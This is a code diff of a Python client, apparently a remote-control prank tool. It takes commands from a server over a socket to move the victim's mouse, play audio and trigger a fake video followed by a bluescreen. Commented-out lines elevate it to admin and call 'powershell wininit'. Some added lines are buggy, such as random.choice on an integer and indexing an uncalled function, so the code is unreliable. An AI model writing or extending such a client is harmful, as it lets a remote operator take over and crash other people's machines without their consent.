@@ -9,6 +9,7 @@ import os
 import ctypes
 import random
 import sys
+import argparse
 
 #Initilizing things
 #ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # Runs as admin
@@ -54,6 +55,9 @@ def bsod(videopath, waittime):
     time.sleep(waittime)
     print("BSOD STARTED")
     #os.system('powershell wininit')
+
+def helpm():
+    returnmsg("mm x y - This command moves the mouse in the set coords \naudio stop | audio audiopath - Either stops or plays audio \nmmr - Moves the mouse in a random spot \nbsod videopath waittime - plays a local video then bluescreens the computer \nexit - Closes the client")
     
 def returnScreenRes():
     res = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
@@ -63,19 +67,26 @@ def parse(args):
     if args[0] == "audio":
         if args[1] == "stop":
             playAudio(True)
+            returnmsg("Audio stopped")
         else:
             playAudio(args[1], False)
+            returnmsg(f"Audio playing = {args[1]}")
     if args[0] == "mm":
-        MoveMouse(int(args[1]), int([2]))
+        MoveMouse(int(args[1]), int(args[2]))
+        returnmsg(f"Moving mouse to {args[1]}x{args[2]}")
     if args[0] == "mmr":
-        MoveMouse(int(random.random(returnScreenRes[0])), int(random.random(returnScreenRes[1])))
+        MoveMouse(int(random.choice(returnScreenRes[0])), int(random.choice(returnScreenRes[1])))
+        returnmsg("Random mouse movement started")
     if args[0] == "bsod":
-        bsod(args[1], args[2])
+        bsod(args[1], float(args[2]))
+        returnmsg("Blue screen activated - Client will restart, restart server now")
+    if args[0] == "help":
+        helpm()
     if args[0] == "exit":
+        returnmsg("Exiting - Start server soon")
         exit()
-
+        
 try:
-    
     while True:
         buffer = server.recv(1024)
         buffer = buffer.decode("utf-8")
@@ -86,4 +97,4 @@ try:
         parse(splitargs)
 except Exception as e:
     print(f'Error: {e}')
-
+    returnmsg(f"Error occured - Client closing \nMore Info: {e}")
